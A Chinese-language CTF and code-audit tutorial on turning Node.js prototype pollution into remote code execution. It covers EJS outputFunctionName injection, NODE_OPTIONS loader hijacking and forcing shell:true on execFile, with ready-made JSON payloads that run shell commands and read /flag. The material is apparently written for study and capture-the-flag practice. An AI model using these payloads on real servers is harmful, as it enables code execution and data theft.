---
date: 2026-10-15
title: "原型链污染高阶：污染模板引擎与环境变量实现RCE"
---
# 🚀 原型链污染高阶武器化：EJS 模板引擎劫持与 NODE_OPTIONS 极速 RCE

> **战术升维**：很多初学者认为原型链污染只能把 `role` 改成 `admin` 搞搞越权。
> 但在顶级 CTF 与高难度代码审计中，原型链污染是通往 **RCE（远程代码执行）** 的神级跳板！
> 本篇深度剖析两大统治级的利用链（Gadgets）：**EJS 模板引擎编译拼接注入** 与 **child_process 子进程衍生结合 NODE_OPTIONS 环境变量代码执行**。

---

## 0. 基础前置认知与小白扫盲：原型链污染如何升级为系统 RCE？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


### 1. 从“变量篡改”到“命令执行”的质变通道
* 初学者往往觉得原型链污染只能改改 `isAdmin = true`，属于纯逻辑层面的小漏洞。
* 但在 Node.js 环境中，原型链污染完全可以**一步跨越为最高危的操作系统命令执行（RCE）！**

---

### 2. 经典落地两大通道
* **通道一：污染模板引擎的执行选项（如 EJS 模板）**：
  * EJS 等模板引擎在编译模板时，会检查配置选项中是否有 `outputFunctionName` 或 `client` 参数；
  * 如果被污染了 `Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("whoami");s'`；
  * 模板在生成动态函数代码并调用 `eval()` 或 `new Function()` 时，恶意代码被直接拼入函数体内执行！
* **通道二：污染子进程环境变量 `NODE_OPTIONS`**：
  * 当 Node.js 后续代码调用 `child_process.fork()` 或 `spawn()` 衍生新进程时，系统会自动继承环境变量；
  * 黑客污染 `Object.prototype.NODE_OPTIONS = '--require /proc/self/environ'`，强行让子进程启动时加载包含恶意代码的伪造环境，直接引爆 Shell！

---

## 一、高阶利用一：EJS 模板引擎动态代码生成注入（Template Injection）

EJS（Embedded JavaScript）是 Express 等 Node.js 框架中最广泛使用的模板渲染引擎之一。

### 1. 源码级漏洞成因：未初始化的 `outputFunctionName`
在 EJS 编译模板的底层源码中（`ejs.js`），为了将 HTML 标签与 JS 变量组合为可执行函数，EJS 内部使用了类似 `new Function(...)` 的动态代码组装机制：

```javascript
// ejs.js 源码片段：准备编译生成渲染函数
prepended += '  var ' + (opts.outputFunctionName || 'escape') + ' = escapeFn || escapeXML;\n';
```

> [!IMPORTANT]
> **代码审计致命点**：
> 1. EJS 试图从渲染选项 `opts` 中读取 `outputFunctionName`（用来定义输出函数的变量名，默认是 `escape`）；
> 2. 如果业务代码在调用 `res.render('index', { user: 'guest' })` 时，没有显式传递 `outputFunctionName`，V8 引擎就会沿着原型链一路向上查找！
> 3. 如果我们通过原型链污染在 `Object.prototype` 上强行植入了 `outputFunctionName`，**EJS 会原封不动地将我们的恶意代码拼接入待编译的 JavaScript 脚本头部！**

---

### 2. 经典攻击 Payload 逐字拆解：
```json
{
  "__proto__": {
    "outputFunctionName": "x; return global.process.mainModule.require('child_process').execSync('cat /flag'); //"
  }
}
```

#### 🔍 拼接后的实际编译代码透视：
```javascript
// EJS 最终交由 new Function() 执行的代码内容：
function (locals, escapeFn, include, rethrow) {
  var x; return global.process.mainModule.require('child_process').execSync('cat /flag'); // = escapeFn || escapeXML;
  var __output = [];
  ...
}
```
* **执行效果**：
  1. `var x;`：闭合前面的变量声明语法；
  2. `return global.process.mainModule.require('child_process').execSync('cat /flag');`：直接调用 Node.js 内置进程执行系统命令读取 Flag 并将执行结果直接返回！
  3. `//`：将 EJS 尾部残余的 `= escapeFn || escapeXML;` 彻底注释掉，语法零报错！
  4. 只要任何普通用户访问网站触发一次合法的 `render()`，当前 Node.js 进程立刻同步执行命令！

---

## 二、高阶利用二：`child_process` 子进程环境变量劫持（`NODE_OPTIONS`）

当目标系统**没有使用 EJS 模板引擎**，但后端业务存在创建子进程的操作（如调用 `child_process.fork()`、`child_process.spawn()` 处理后台任务，如视频转码、PDF 转换、Git 操作）时，如何直接打穿拿 Shell？

### 1. 环境变量继承漏洞链
在 Node.js 中，调用 `child_process.spawn('node', ['worker.js'], options)` 时：
* 如果外部没有传递 `options.env`，子进程默认继承父进程的 `process.env`；
* 但是，如果通过原型链污染向 `Object.prototype.env` 注入了自定义环境变量字典，**Node.js 在派生新进程时会强制加载该环境变量！**

---

### 2. 核心大杀器：`NODE_OPTIONS` 结合 `--experimental-loader`

`NODE_OPTIONS` 是 Node.js 官方支持的环境变量，用于在 Node 进程启动时自动追加命令行参数（如加载调试器、预装载模块）。

#### 🔍 终极利用 Payload（结合 constructor.prototype 绕过）：
```json
{
  "constructor": {
    "prototype": {
      "env": {
        "NODE_OPTIONS": "--experimental-loader=data:text/javascript,import%20fs%20from%20'node:fs'%3Bconsole.log(fs.readFileSync('/flag','utf8'))%3B"
      }
    }
  }
}
```

#### 🔍 逐参数与执行机制深度剖析表：
| 参数 / 属性 | 底层语法作用 | 为什么这样构造？ |
| :--- | :--- | :--- |
| `"constructor": {"prototype": ...}` | 绕过应用层可能存在的 `__proto__` 键名黑名单。 | 保证成功将属性写入 `Object.prototype`。 |
| `"env": { ... }` | 污染子进程创建时的环境配置对象。 | 当执行 `spawn()` 时，新进程自动拾取被污染的 `env` 环境变量列表。 |
| `NODE_OPTIONS` | Node.js 原生底层环境变量。指示 Node 运行时启动时的前置行为。 | 任何新启动的 Node 进程都会无条件执行该变量指定的参数。 |
| `--experimental-loader=...` | Node.js 实验性模块加载器参数。 | 允许在 Node 主程序运行之前，**优先预加载一个自定义 Loader 模块**！ |
| `data:text/javascript,...` | **Data 协议内联代码**。直接在 URL 中内嵌纯 JS 脚本文本！ | **彻底摆脱服务器本地写文件的依赖！** 无需先上传 `.js` 文件，直接在内存中以数据流执行代码！ |
| `import fs from 'node:fs';` | 引入文件系统模块并执行 `fs.readFileSync('/flag')`。 | 读取敏感数据并打印至子进程标准输出。 |

* **触发利用**：随后只要系统在任何路由下调用了 `spawn` 启动新进程，新进程在启动的一瞬间就会执行内联 JavaScript 代码，实现远程代码执行与敏感文件获取！

---

## 三、高阶利用三：`execFile` 中的 `shell: true` 降级逃逸

在安全规范中，调用 `child_process.execFile('git', [userInput])` 是防范命令注入的标准写法（因为直接调用操作系统可执行文件，参数不会被 Shell 解释器解析）。

### 1. 污染降级原理：
在 `execFile` 底层实现中，有一个配置选项 `options.shell`：
```javascript
// child_process.js
const shell = options.shell;
if (shell) {
    // 💥 如果 shell 为 true，底层自动退化为调用 /bin/sh -c 'git "userInput"'！
}
```
### 2. 利用手段：
通过原型链污染注入：
```json
{"__proto__": {"shell": true}}
```
* **后果**：原本安全的 `execFile` 被全局强行降级为危险的 `exec()`！此时如果在 `userInput` 中传入 `; id ;` 或 `| whoami` 等管道截断符，Shell 解释器会重新介入解析，直接达成命令注入！

---

## 🔗 相关双向链接
- 上级模块：[[07-反序列化漏洞深度专精]]
- 前置原理：[[NodeJS原型链污染底层机制与递归合并漏洞]]
- 全栈总览：[[00-Web安全与CTF知识地图总览]]
